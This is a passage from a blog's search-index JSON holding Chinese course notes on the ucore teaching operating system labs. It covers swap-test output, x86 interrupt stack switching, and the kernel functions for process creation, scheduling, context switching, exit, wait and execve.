\u7684\u9875\u8868\u9879\u4e3a\u5bf9\u5e94\u7269\u7406\u9875\u3002</li> <li>\u8bbf\u95ee b \u65f6 pgfault...</li> <li>...</li> </ol> </li> </ol> <p>\u8f93\u51fa\u5982\u4e0b\uff1a</p> <pre><code>check_vma_struct() succeeded!\npage fault at 0x00000100: K/W [no page found].\ncheck_pgfault() succeeded!\ncheck_vmm() succeeded.\nide 0:      10000(sectors), 'QEMU HARDDISK'.\nide 1:     262144(sectors), 'QEMU HARDDISK'.\nSWAP: manager = fifo swap manager\nBEGIN check_swap: count 1, total 31964\nsetup Page Table for vaddr 0X1000, so alloc a page\nsetup Page Table vaddr 0~4MB OVER!\nset up init env for check_swap begin!\npage fault at 0x00001000: K/W [no page found].\npage fault at 0x00002000: K/W [no page found].\npage fault at 0x00003000: K/W [no page found].\npage fault at 0x00004000: K/W [no page found].\nset up init env for check_swap over!\nwrite Virt Page c in fifo_check_swap\nwrite Virt Page a in fifo_check_swap\nwrite Virt Page d in fifo_check_swap\nwrite Virt Page b in fifo_check_swap\nwrite Virt Page e in fifo_check_swap\npage fault at 0x00005000: K/W [no page found].\nswap_out: i 0, store page in vaddr 0x1000 to disk swap entry 2\nwrite Virt Page b in fifo_check_swap\nwrite Virt Page a in fifo_check_swap\npage fault at 0x00001000: K/W [no page found].\nswap_out: i 0, store page in vaddr 0x2000 to disk swap entry 3\nswap_in: load disk swap entry 2 with swap_page in vadr 0x1000\nwrite Virt Page b in fifo_check_swap\npage fault at 0x00002000: K/W [no page found].\nswap_out: i 0, store page in vaddr 0x3000 to disk swap entry 4\nswap_in: load disk swap entry 3 with swap_page in vadr 0x2000\nwrite Virt Page c in fifo_check_swap\npage fault at 0x00003000: K/W [no page found].\nswap_out: i 0, store page in vaddr 0x4000 to disk swap entry 5\nswap_in: load disk swap entry 4 with swap_page in vadr 0x3000\nwrite Virt Page d in fifo_check_swap\npage fault at 0x00004000: K/W [no page found].\nswap_out: i 0, store page in vaddr 0x5000 to disk swap entry 6\nswap_in: load disk swap entry 5 with swap_page in vadr 0x4000\nwrite Virt Page e in fifo_check_swap\npage fault at 0x00005000: K/W [no page found].\nswap_out: i 0, store page in vaddr 0x1000 to disk swap entry 2\nswap_in: load disk swap entry 6 with swap_page in vadr 0x5000\nwrite Virt Page a in fifo_check_swap\npage fault at 0x00001000: K/R [no page found].\nswap_out: i 0, store page in vaddr 0x2000 to disk swap entry 3\nswap_in: load disk swap entry 2 with swap_page in vadr 0x1000\ncount is 0, total is 7\ncheck_swap() succeeded!\n</code></pre>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/","title":"ucore lab3 \u603b\u7ed3","text":"","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#\u76ee\u5f55","title":"\u76ee\u5f55","text":"<ol> <li>x86 \u4e2d\u65ad/\u5f02\u5e38\u5904\u7406 (tss \u548c tf \u4f5c\u7528)</li> <li>\u91cd\u8981\u51fd\u6570\u8bf4\u660e     1. \u521b\u5efa\u8fdb\u7a0b (\u7ebf\u7a0b)     2. \u8c03\u5ea6\uff0c\u8fd0\u884c     3. do_wait &amp; do_exit     4. do_execve     5. \u5176\u5b83\u7cfb\u7edf\u8c03\u7528</li> <li>FAQ     1. \u4e00\u4e2a\u8fdb\u7a0b\u88ab\u521b\u5efa\u540e\u5982\u4f55\u5f00\u59cb\u6267\u884c\uff1f     2. \u4e00\u4e2a\u7528\u6237\u8fdb\u7a0b\u5982\u679c\u56e0\u4e3a\u65f6\u95f4\u7247\u7528\u5b8c\u800c\u88ab\u8c03\u5ea6\u6389\u540e\uff0c\u518d\u6b21\u88ab\u8c03\u5ea6\u56de\u6765\u65f6\u4f1a\u4ece\u54ea\u91cc\u7ee7\u7eed\u6267\u884c\uff1f     3. \u4e00\u4e2a\u8fdb\u7a0b\u7684\u5b8c\u6574\u751f\u547d\u5468\u671f\uff1f     4. fork \u8c03\u7528\uff0c\u4e3a\u4ec0\u4e48\u7236\u8fdb\u7a0b\u8fd4\u56de\u503c\u4e3a pid\uff0c\u5b50\u8fdb\u7a0b\u8fd4\u56de\u503c\u4e3a 0\uff08\u6d89\u53ca\u5230\u7528\u6237\u8fdb\u7a0b\u7684\u521b\u5efa\uff09</li> </ol>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#\u603b\u7ed3","title":"\u603b\u7ed3","text":"<p>\u5b9e\u9a8c 3 \u6d89\u53ca\u5230\u7684\u77e5\u8bc6\u70b9\uff1a</p> <ol> <li>x86 \u4e2d\u65ad\u4e2d tss \u7684\u4f5c\u7528\uff08\u7c7b\u4f3c\u7684\u5185\u6838\u6808\uff0c\u4e2d\u65ad\u5e27\u7684\u6982\u5ff5\uff09</li> <li>\u8fdb\u7a0b\u5982\u4f55\u521b\u5efa\u3001\u6267\u884c\u3001\u5207\u6362\uff08do_fork, do_wait, do_exit \u7b49\u7cfb\u7edf\u8c03\u7528\u7684\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\uff09</li> <li>\u7528\u6237\u8fdb\u7a0b\u7684\u521b\u5efa\u3001\u6267\u884c\u8fc7\u7a0b</li> <li>\u7528\u6237 ulib \u5e93 fork, wait, exit \u7684\u5b9e\u73b0</li> </ol>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#x86-\u4e2d\u65ad\u5f02\u5e38\u5904\u7406-tss-\u548c-tf-\u4f5c\u7528","title":"x86 \u4e2d\u65ad/\u5f02\u5e38\u5904\u7406 (tss \u548c tf \u4f5c\u7528)","text":"<p>p.s. \u89c1 x86 manual Vol. 1 6-11</p> <p>If the code segment for the handler procedure has the same privilege level as the currently executing program or task, the handler procedure uses the current stack; if the handler executes at a more privileged level, the processor switches to the stack for the handler\u2019s privilege level.</p> <p>Call</p> <p>If no stack switch occurs, the processor does the following when calling an interrupt or exception handler (see Figure 6-5):</p> <ol> <li>Pushes the current contents of the EFLAGS, CS, and EIP registers (in that order) on the stack.</li> <li>Pushes an error code (if appropriate) on the stack.</li> <li>Loads the segment selector for the new code segment and the new instruction pointer (from the interrupt gate or trap gate) into the CS and EIP registers, respectively.</li> <li>If the call is through an interrupt gate, clears the IF flag in the EFLAGS register.</li> <li>Begins execution of the handler procedure.</li> </ol> <p>If a stack switch does occur, the processor does the following:</p> <ol> <li>Temporarily saves (internally) the current contents of the SS, ESP, EFLAGS, CS, and EIP registers.</li> <li>Loads the segment selector and stack pointer for the new stack (that is, the stack for the privilege level being called) from the TSS into the SS and ESP registers and switches to the new stack.</li> <li>Pushes the temporarily saved SS, ESP, EFLAGS, CS, and EIP values for the interrupted procedure\u2019s stack onto the new stack.</li> <li>Pushes an error code on the new stack (if appropriate).</li> <li>Loads the segment selector for the new code segment and the new instruction pointer (from the interrupt gate or trap gate) into the CS and EIP registers, respectively.</li> <li>If the call is through an interrupt gate, clears the IF flag in the EFLAGS register.</li> <li>Begins execution of the handler procedure at the new privilege level.</li> </ol> <p>return</p> <p>A return from an interrupt or exception handler is initiated with the IRET instruction. The IRET instruction is similar to the far RET instruction, except that it also restores the contents of the EFLAGS register for the interrupted proce-dure.</p> <p>When executing a return from an interrupt or exception handler from the same privilege level as the inter-rupted procedure, the processor performs these actions:</p> <ol> <li>Restores the CS and EIP registers to their values prior to the interrupt or exception.</li> <li>Restores the EFLAGS register.</li> <li>Increments the stack pointer appropriately.</li> <li>Resumes execution of the interrupted procedure.</li> </ol> <p>When executing a return from an interrupt or exception handler from a different privilege level than the interrupted procedure, the processor performs these actions:</p> <ol> <li>Performs a privilege check.</li> <li>Restores the CS and EIP registers to their values prior to the interrupt or exception.</li> <li>Restores the EFLAGS register.</li> <li>Restores the SS and ESP registers to their values prior to the interrupt or exception, resulting in a stack switch back to the stack of the interrupted procedure.</li> <li>Resumes execution of the interrupted procedure.</li> </ol> <p></p> <p>\u603b\u7ed3\uff1a</p> <p>\u53d1\u751f\u4e2d\u65ad\uff0c\u65e0\u7279\u6743\u7ea7\u8f6c\u6362\u65f6\uff0c\u4f7f\u7528\u539f\u672c\u7684\u6808\u6765\u5b58\u50a8\u4e2d\u65ad\u5e27\u3002\u53d1\u751f\u7279\u6743\u7ea7\u8f6c\u6362\u65f6\uff08\u597d\u50cf\u53ea\u6709\u7528\u6237\u6001\u5230\u5185\u6838\u6001\uff09\uff0c\u4f7f\u7528\u5f53\u524d\u8fdb\u7a0b tss \u4e2d\u7684 ss0, esp0 \u6240\u6307\u5411\u7684\u6808\uff08\u5185\u6838\u6808\uff09\u6765\u5b58\u50a8\u4e2d\u65ad\u5e27\uff0c\u4e14 cpu \u4f1a\u5728\u4e2d\u65ad\u5e27\u4e2d\u989d\u5916\u5b58\u50a8\u5f53\u524d\u7684 ss \u548c esp\u3002\uff08p.s. cpu \u901a\u8fc7\u6bd4\u8f83\u4e2d\u65ad\u5411\u91cf\u6307\u5411\u7684\u4e2d\u65ad\u63cf\u8ff0\u7b26\u548c cs \u5bc4\u5b58\u5668\u6765\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u7279\u6743\u7ea7\u7684\u8f6c\u6362\u3002\u800c\u6267\u884c iret \u65f6\uff0ccpu \u901a\u8fc7\u6bd4\u8f83\u6808\u4e2d\u7684 cs \u548c cs \u5bc4\u5b58\u5668\u6765\u68c0\u6d4b\u662f\u5426\u9700\u8981\u7279\u6743\u7ea7\u7684\u8f6c\u6362\uff09</p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#\u91cd\u8981\u51fd\u6570\u8bf4\u660e","title":"\u91cd\u8981\u51fd\u6570\u8bf4\u660e","text":"","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#\u521b\u5efa\u8fdb\u7a0b-\u7ebf\u7a0b","title":"\u521b\u5efa\u8fdb\u7a0b (\u7ebf\u7a0b)","text":"<ol> <li> <p>kernel_thread</p> <pre><code>int kernel_thread(int (*fn)(void *), void *arg, uint32_t clone_flags)\n</code></pre> <p>\u4f5c\u7528\uff1a\u521b\u5efa\u4e00\u4e2a\u5185\u6838\u7ebf\u7a0b\uff0c\u8be5\u7ebf\u7a0b\u5c06\u6267\u884c fn \u51fd\u6570\uff0c\u53c2\u6570\u4e3a arg\uff0cclone_flags \u63a7\u5236\u662f\u5426\u5171\u4eab\u7236\u8fdb\u7a0b\u5185\u5b58\uff0c\u8fd4\u56de\u7ebf\u7a0b pid\u3002</p> <p>\u5b9e\u73b0\uff1a</p> <ol> <li> <p>\u8bbe\u7f6e tf</p> <pre><code>tf.tf_regs.reg_ebx = (uint32_t)fn;\ntf.tf_regs.reg_edx = (uint32_t)arg;\ntf.tf_eip = (uint32_t)kernel_thread_entry;\n</code></pre> <p>\u5176\u4e2d kernel_thread_entry \u5982\u4e0b\uff1a</p> <pre><code>kernel_thread_entry:        # void kernel_thread(void)\n\n    pushl %edx              # push arg\n    call *%ebx              # call fn\n\n    pushl %eax              # save the return value of fn(arg)\n    call do_exit            # call do_exit to terminate current thread\n</code></pre> <p>\u8bf4\u660e\uff1a</p> <p>1. \u4e2d\u65ad\u5e27\u4e2d\u7684 eip \u88ab\u8bbe\u7f6e\u4e3a\u4e86 kernel_thread_entry\uff0c\u5982\u679c\u8ba9 cpu \u6839\u636e\u8be5\u4e2d\u65ad\u5e27\u8fd4\u56de\uff0ccpu \u4fbf\u4f1a\u56de\u5230 kernel_thread_entry\uff0c\u7136\u540e\u7531\u4e8e\u901a\u7528\u5bc4\u5b58\u5668 ebx, edx \u4e5f\u5df2\u7ecf\u6062\u590d\u6210 fn, arg \u7684\u503c\uff0c\u56e0\u800c\u53ef\u4ee5\u6210\u529f\u8c03\u7528 fn \u51fd\u6570\u3002</p> <p>2. \u540e\u9762 do_fork \u4e2d\u7684 copy_thread \u51fd\u6570\u4f1a\u5c06\u8fdb\u7a0b context \u4e2d\u7684 eip \u8bbe\u4e3a forkret\uff0c\u800c forkret \u4fbf\u4f1a\u8ba9\u8fdb\u7a0b\u4ece\u4e2d\u65ad\u5e27\u8fd4\u56de</p> <p>3. \u5f53\u8fdb\u7a0b\u7ed3\u675f\u65f6\u4f1a\u8c03\u7528 do_exit</p> </li> <li> <p>\u8c03\u7528 do_fork</p> <pre><code>do_fork(clone_flags | CLONE_VM, 0, &amp;tf);\n</code></pre> </li> </ol> </li> <li> <p>do_fork</p> <pre><code>/* do_fork -     parent process for a new child process\n * @clone_flags: used to guide how to clone the child process\n * @stack:       the parent's user stack pointer. if stack==0, It means to fork a kernel thread.\n * @tf:          the trapframe info, which will be copied to child process's proc-&gt;tf\n */\nint\ndo_fork(uint32_t clone_flags, uintptr_t stack, struct trapframe *tf)\n</code></pre> <p>\u4f5c\u7528\uff1a\u4ece\u7236\u8fdb\u7a0b\u4ea7\u751f\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff08\u901a\u8fc7 clone_flags \u6765\u63a7\u5236\u662f\u5426\u5171\u4eab\u5185\u5b58\uff09</p> <p>\u8bf4\u660e\uff1a\u76ee\u524d\u53ea\u7528\u4e8e\u5b9e\u73b0 kernel_thread \u51fd\u6570\uff0c\u5982\u679c\u8981\u8ba9\u7528\u6237\u8fdb\u7a0b\u901a\u8fc7 do_fork \u6765\u4ea7\u751f\u5b50\u8fdb\u7a0b\uff0c\u5e94\u8be5\u9700\u8981\u518d\u5c01\u88c5\u4e00\u4e2a\u7c7b\u4f3c\u4e8e kernel_thread \u7684\u51fd\u6570\uff0c\u5176\u4e2d tf.eip \u7684\u8bbe\u7f6e\u5c31\u4e0d\u4f1a\u7528 kernel_thread_entry \u4e86\u3002</p> <p>\u5b9e\u73b0\uff1a</p> <pre><code>    //    1. call alloc_proc to allocate a proc_struct\n    //    2. call setup_kstack to allocate a kernel stack for child process (8KB)\n    //    3. call copy_mm to dup OR share mm according clone_flag\n    //    4. call copy_thread to setup tf &amp; context in proc_struct\n    //    5. insert proc_struct into hash_list &amp;&amp; proc_list\n    //    6. call wakeup_proc to make the new child process RUNNABLE\n //    7. set ret vaule using child proc's pid\n</code></pre> <ol> <li> <p>alloc_proc, \u5206\u914d\u4e00\u4e2a pcb \u7ed3\u6784\u4f53</p> </li> <li> <p>setup_kstack, \u5206\u914d\u5185\u6838\u6808\u7a7a\u95f4 (8KB)</p> </li> <li> <p>copy_mm, \u590d\u5236\u9875\u8868/\u5171\u4eab\u9875\u8868</p> <pre><code>static int\ncopy_mm(uint32_t clone_flags, struct proc_struct *proc) \n</code></pre> <p><code>clone_flags &amp; CLONE_VM</code>\u4e3a\u771f\u65f6\uff0cproc \u7684 mm \u8bbe\u7f6e\u4e3a current-&gt;mm\uff0c\u5373\u548c\u5f53\u524d\u8fdb\u7a0b\u5171\u4eab\u5185\u5b58\u3002</p> <p>p.s. vma \u4e00\u81f4\uff0c\u56e0\u6b64\u8fdb\u7a0b\u6709\u6548\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u4e00\u81f4\u3002\u9875\u8868\u4e00\u81f4\uff0c\u56e0\u6b64\u8bbf\u95ee\u540c\u4e00\u4efd\u7269\u7406\u5730\u5740</p> <p>\u5426\u5219\uff0c\u590d\u5236\u5f53\u524d\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58 (vma)\uff0c\u590d\u5236\u7269\u7406\u5185\u5b58\u5e76\u8bbe\u7f6e\u5bf9\u5e94\u7684\u9875\u8868\u3002\uff08\u590d\u5236\u4e86\u5f53\u524d\u8fdb\u7a0b\u7684\u5185\u5b58\uff09</p> <p>\u5b9e\u73b0\uff1a</p> <p>copy_mm</p> <p>-&gt; dup_mmap, \u8c03\u7528 copy_range \u590d\u5236\u6bcf\u4e00\u4e2a vma</p> <p>-&gt; copy_range, \u590d\u5236\u4e00\u6bb5\u865a\u62df\u5730\u5740\u5bf9\u5e94\u7684\u7269\u7406\u5185\u5b58\uff0c\u5e76\u8bbe\u7f6e\u9875\u8868</p> </li> <li> <p>copy_thread, \u8bbe\u7f6e tf, context</p> <p>\u4e2d\u65ad\u5e27\u4f4d\u4e8e\u5185\u6838\u6808\u9876\u90e8</p> <pre><code>proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - 1;\n</code></pre> <p>\u8bbe\u7f6e\u7ebf\u7a0b context \u7684\u521d\u59cb\u72b6\u6001\uff0ceip \u8bbe\u7f6e\u4e3a forkret</p> <pre><code>proc-&gt;context.eip = (uintptr_t)forkret;\nproc-&gt;context.esp = (uintptr_t)(proc-&gt;tf); #\u66f4\u65b0\u6808\u9876\u4f4d\u7f6e\n</code></pre> </li> <li> <p>get_pid, \u8bbe\u7f6e\u8fdb\u7a0b pid</p> <p>hash_proc, \u5c06\u8fdb\u7a0b\u6dfb\u52a0\u5230\u54c8\u5e0c\u8868 hash_list</p> <p>set_links, \u5c06\u8fdb\u7a0b\u6dfb\u52a0\u5230\u8fdb\u7a0b\u53cc\u5411\u94fe\u8868 proc_list\uff0c\u5e76\u5c06\u8fdb\u7a0b\u8bbe\u7f6e\u4e3a\u5176\u7236\u8fdb\u7a0b\u6700\u5c0f\u7684\u5b50\u8fdb\u7a0b cptr</p> </li> <li> <p>wakeup_proc, \u5c06\u8fdb\u7a0b\u8bbe\u7f6e\u4e3a runnable</p> </li> </ol> </li> </ol>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#\u8c03\u5ea6\u8fd0\u884c","title":"\u8c03\u5ea6\uff0c\u8fd0\u884c","text":"<ol> <li> <p>schedule</p> <pre><code>void schedule(void)\n</code></pre> <p>\u4f5c\u7528\uff1a</p> <p>\u6309\u7167 FIFO \u7684\u7b56\u7565\uff0c\u4ece\u8fdb\u7a0b\u94fe\u8868\u4e2d\u9009\u62e9\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884c\u3002\u5982\u679c\u6ca1\u6709\u627e\u5230\u7684\u8bdd\uff0c\u6267\u884c idle \u8fdb\u7a0b\u3002</p> </li> <li> <p>proc_run</p> <pre><code>void\nproc_run(struct proc_struct *proc)\n</code></pre> <p>\u4f5c\u7528\uff1a</p> <p>\u5f00\u59cb\u8fd0\u884c\u4e00\u4e2a\u8fdb\u7a0b</p> <p>\u5b9e\u73b0\uff1a</p> <pre><code>current = proc; //\u8bbe\u7f6e proc \u4e3a\u5f53\u524d\u8fdb\u7a0b\n\n//kstack+KSTACKSIZE \u4e3a\u8fdb\u7a0b\u5185\u6838\u6808\u6808\u9876\uff0c\u8bbe\u7f6e ts \u4e2d\u7684 esp0\uff0c\u5f53\u4e2d\u65ad\u4e14\u5b58\u5728\u7279\u6743\u7ea7\u8f6c\u6362\u65f6\uff0c\u4f7f\u7528\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u3002\nload_esp0(next-&gt;kstack + KSTACKSIZE); \n\n//\u5207\u6362\u9875\u76ee\u5f55\u8868\u3002\u56e0\u4e3a\u5185\u6838\u4ee3\u7801\u4f4d\u4e8e 0-4M \u4ee5\u5185\uff0c\u800c\u6240\u6709\u8fdb\u7a0b\u7684\u9875\u8868\u90fd\u5b58\u5728\u8be5\u6bb5\u5730\u5740\u7684\u6620\u5c04\uff0c\u56e0\u6b64\u5207\u6362\u540e\uff0c\u540e\u9762\u7684\u4ee3\u7801\u90fd\u662f\u80fd\u6b63\u5e38\u6267\u884c\u7684\nlcr3(next-&gt;cr3);\n\nswitch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context));\n</code></pre> </li> <li> <p>switch_to</p> <pre><code>switch_to:                      # switch_to(from, to)\n\n    # save from's registers\n    movl 4(%esp), %eax          # eax points to from\n    popl 0(%eax)                # save eip !popl\n    movl %esp, 4(%eax)\n    movl %ebx, 8(%eax)\n    movl %ecx, 12(%eax)\n    movl %edx, 16(%eax)\n    movl %esi, 20(%eax)\n    movl %edi, 24(%eax)\n    movl %ebp, 28(%eax)\n\n    # restore to's registers\n    movl 4(%esp), %eax          # not 8(%esp): popped return address already\n                                # eax now points to to\n    movl 28(%eax), %ebp\n    movl 24(%eax), %edi\n    movl 20(%eax), %esi\n    movl 16(%eax), %edx\n    movl 12(%eax), %ecx\n    movl 8(%eax), %ebx\n    movl 4(%eax), %esp\n\n    pushl 0(%eax)               # push eip\n\n    ret\n</code></pre> <p>\u4f5c\u7528\uff1a</p> <p>\u4fdd\u5b58\u5f53\u524d\u4e0a\u4e0b\u6587\u5230\u5207\u6362\u524d\u8fdb\u7a0b (from) \u7684 context \u4e2d\uff0c\u5e76\u6062\u590d\u5207\u6362\u540e\u8fdb\u7a0b (to) \u7684 context</p> </li> </ol>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#do_wait--do_exit","title":"do_wait &amp; do_exit","text":"<ol> <li> <p>do_exit</p> <pre><code>// do_exit - called by sys_exit\n//   1. call exit_mmap &amp; put_pgdir &amp; mm_destroy to free the almost all memory space of process\n//   2. set process' state as PROC_ZOMBIE, then call wakeup_proc(parent) to ask parent reclaim itself.\n//   3. call scheduler to switch to other process\nint do_exit(int error_code)\n</code></pre> <p>\u4f5c\u7528\uff1a</p> <p>\u91ca\u653e\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\uff0c\u5c06\u8fdb\u7a0b\u8bbe\u7f6e\u4e3a ZOMBIE \u72b6\u6001\uff0c\u5e76\u5524\u9192\u7236\u7ebf\u7a0b\uff08\u8bbe\u7f6e\u4e3a RUNNABLE\uff09\uff0c\u7136\u540e\u8c03\u7528\u8c03\u5ea6\u5668\u3002</p> <p>\u5173\u952e\u4ee3\u7801\uff1a</p> <pre><code>lcr3(boot_cr3);\nif (mm_count_dec(mm) == 0) {\n    exit_mmap(mm); //\u662f copy_mm \u7684\u9006\u8fc7\u7a0b\uff0c\u91ca\u653e\u4e86\u7269\u7406\u5185\u5b58\u548c\u9875\u8868\n    put_pgdir(mm); //\u91ca\u653e\u9875\u76ee\u5f55\u8868\n    mm_destroy(mm); //\u91ca\u653e vma\n}\ncurrent-&gt;mm = NULL;\n</code></pre> <p>\u5982\u679c\u8be5\u8fdb\u7a0b\u6709\u5b50\u8fdb\u7a0b\uff0c\u5219\u8fd8\u9700\u8981\u5c06\u5b50\u8fdb\u7a0b\u8bbe\u7f6e\u4e3a init \u8fdb\u7a0b\u7684\u5b50\u8fdb\u7a0b\u3002</p> </li> <li> <p>do_wait</p> <pre><code>// do_wait - wait one OR any children with PROC_ZOMBIE state, and free memory space of kernel stack\n//         - proc struct of this child.\n// NOTE: only after do_wait function, all resources of the child proces are free.\nint\ndo_wait(int pid, int *code_store)\n</code></pre> <p>\u4f5c\u7528\uff1a</p> <p>\u7b49\u5f85\u4e00\u4e2a\u6216\u4efb\u610f\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u6267\u884c do_exit \u53d8\u4e3a Zombie \u72b6\u6001\uff0c\u7136\u540e\u91ca\u653e\u5b50\u8fdb\u7a0b\u7684\u7ed3\u6784\u4f53</p> </li> </ol>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#do_execve","title":"do_execve","text":"<ol> <li> <p>do_execve</p> <pre><code>// do_execve - call exit_mmap(mm)&amp;put_pgdir(mm) to reclaim memory space of current process\n//           - call load_icode to setup new memory space accroding binary prog.\nint\ndo_execve(const char *name, size_t len, unsigned char *binary, size_t size)\n</code></pre> <p>\u4f5c\u7528\uff1a</p> <p>\u6839\u636e\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u4e3a\u5f53\u524d\u8fdb\u7a0b\u8bbe\u7f6e\u65b0\u7684\u5185\u5b58\u7a7a\u95f4</p> <p>\u6ce8\u610f\u70b9\uff1a</p> <ol> <li>\u5728 lab3 \u4e2d\uff0cuser_main \u8fdb\u7a0b\u662f\u901a\u8fc7 kernel_thread \u521b\u5efa\u7684\uff0c\u6240\u4ee5\u521a\u5f00\u59cb\u662f\u4e00\u4e2a\u5185\u6838\u8fdb\u7a0b\u3002\u4f46\u901a\u8fc7 sys_execve \u7cfb\u7edf\u8c03\u7528\u540e\uff0c\u65b0\u7684\u5185\u5b58\u7a7a\u95f4</li> </ol> </li> <li> <p>load_icode</p> <p>\u4f5c\u7528\uff1a</p> <p>\u5c06 ELF \u6587\u4ef6\u8bfb\u5230\u5185\u5b58\uff0c\u5e76\u4e3a\u5f53\u524d\u8fdb\u7a0b\u91cd\u65b0\u8bbe\u7f6e\u5185\u5b58\u7a7a\u95f4 (mm \u865a\u62df\u5185\u5b58\uff0c\u9875\u8868)\u3002</p> <p>\u5e76\u4fee\u6539\u4e86\u5f53\u524d\u8fdb\u7a0b\u7684 tf \u4e3a\uff1acs \u4e3a\u7528\u6237\u6bb5\uff0cesp \u4f7f\u7528\u7528\u6237\u6808\uff0ceip \u4e3a elf-&gt;entry</p> <pre><code>tf-&gt;tf_cs = USER_CS;\ntf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;\ntf-&gt;tf_esp = USTACKTOP;\ntf-&gt;tf_eip = elf-&gt;e_entry;\ntf-&gt;tf_eflags = FL_IF;\n</code></pre> </li> </ol>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#\u5176\u5b83\u7cfb\u7edf\u8c03\u7528","title":"\u5176\u5b83\u7cfb\u7edf\u8c03\u7528","text":"<ol> <li> <p>do_yeild</p> <p>\u8fdb\u884c\u4e00\u6b21\u8fdb\u7a0b\u8c03\u5ea6\uff08\u901a\u8fc7\u8bbe\u7f6e need_reschedule\uff09</p> </li> <li> <p>do_kill</p> <p>\u5c06\u8fdb\u7a0b Flag \u8bbe\u7f6e\u4e3a PF_EXITING\uff0c\u5f53 switch_to \u5230\u8be5\u8fdb\u7a0b\u540e\u4f1a\u89e6\u53d1 do_exit(KILLED)</p> </li> </ol>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/20/2020-09-20-ucore-lab3-%E6%80%BB%E7%BB%93/#faq","title":"FAQ","text":"<ol> <li> <p>\u4e00\u4e2a\u8fdb\u7a0b\u88ab\u521b\u5efa\u540e\u5982\u4f55\u5f00\u59cb\u6267\u884c\uff1f</p> <p>\u7b54\uff1a</p> <ol> <li>\u901a\u8fc7 kernel_thread \u521b\u5efa\u7684\u5185\u6838\u8fdb\u7a0b\u3002kernel_thread \u8c03\u7528 do_fork\uff08\u5206\u914d\u5185\u6838\u6808\uff0c\u5185\u5b58\u7a7a\u95f4\uff09\u540e\uff0c\u8fdb\u7a0b\u72b6\u6001\u4e3a Runnable\uff0c\u5f53\u88ab\u8c03\u5ea6\u5668\u8c03\u5ea6\u5230\u65f6 (schedule)\uff0c\u4f1a\u901a\u8fc7 proc_run -&gt; switch_to \u8fdb\u884c\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u800c\u7531\u4e8e\u8fdb\u7a0b\u7684\u521d\u59cb\u4e0a\u4e0b\u6587 (context) \u7684 eip \u88ab\u8bbe\u7f6e\u4e3a\u4e86 forkret\uff0c\u4e8e\u662f\u4f1a\u4ece forkret \u5f00\u59cb\u6267\u884c\uff0cforkret \u4f1a\u6267\u884c\u4e2d\u65ad\u8fd4\u56de\u7684\u4ee3\u7801\uff0ciret \u5230 kernel_thread_entry \u5904\u5f00\u59cb\u6267\u884c\uff0c\u4ece\u800c\u6267\u884c\u8fdb\u7a0b\u7684\u51fd\u6570\u4ee3\u7801\u3002</li> <li>\u7528\u6237\u8fdb\u7a0b\u53c2\u8003 FAQ#4</li> <li>\u8fdb\u7a0b\u8c03\u7528 do_execve \u540e\u4f1a\u91cd\u65b0\u5206\u914d\u5185\u5b58\u7a7a\u95f4\uff0c\u91cd\u65b0\u8bbe\u7f6e tf(eip \u4e3a elf-&gt;entry)\uff0c\u91cd\u65b0\u5f00\u59cb\u6267\u884c\u3002</li> </ol> </li> <li> <p>\u4e00\u4e2a\u7528\u6237\u8fdb\u7a0b\u5982\u679c\u56e0\u4e3a\u65f6\u95f4\u7247\u7528\u5b8c\u800c\u88ab\u8c03\u5ea6\u6389\u540e\uff0c\u518d\u6b21\u88ab\u8c03\u5ea6\u56de\u6765\u65f6\u4f1a\u4ece\u54ea\u91cc\u7ee7\u7eed\u6267\u884c\uff1f</p> <p>\u5f53 CPU \u9047\u5230\u4e2d\u65ad\u540e\uff0c\u4f1a\u8fdb\u5165\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\uff08vector.S -&gt; __all_traps -&gt; trap() -&gt; trap_dispatch() -&gt; \u5f02\u5e38\u5904\u7406 -&gt; \u8fd4\u56de\u5230 trap_ret -&gt; \u4e2d\u65ad\u8fd4\u56de\uff09\uff0cucore 